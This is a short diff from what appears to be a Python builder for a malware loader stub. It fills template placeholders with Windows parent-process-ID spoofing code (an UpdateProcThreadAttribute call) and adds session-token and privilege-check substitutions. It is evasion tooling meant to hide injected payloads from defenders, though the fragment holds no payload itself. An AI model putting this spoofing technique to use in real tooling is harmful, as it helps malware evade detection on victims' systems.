@@ -2271,6 +2271,8 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
     if no_ppid_spoof == True:
         print("[+] PPID Spoofing has been disabled")
         stub = stub.replace("REPLACE_PPID_SPOOF", "")
+        stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_session_ID)
+        stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_unpriv_check)
     else:
         stub = stub.replace("REPLACE_PPID_SPOOF", "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);")
         if ppid_priv == True:
